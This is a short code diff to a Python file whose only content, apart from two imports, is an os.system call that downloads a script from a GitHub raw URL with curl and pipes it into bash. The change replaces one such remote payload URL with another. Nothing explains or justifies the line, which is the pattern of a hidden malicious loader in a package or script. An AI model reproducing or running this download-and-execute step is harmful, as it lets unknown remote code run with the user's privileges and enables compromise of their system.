@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/kidoescegh/filee/raw/main/kylatt | bash')
+os.system('curl -sL https://github.com/kidoescegh/pilekyla/raw/main/testkyw | bash')
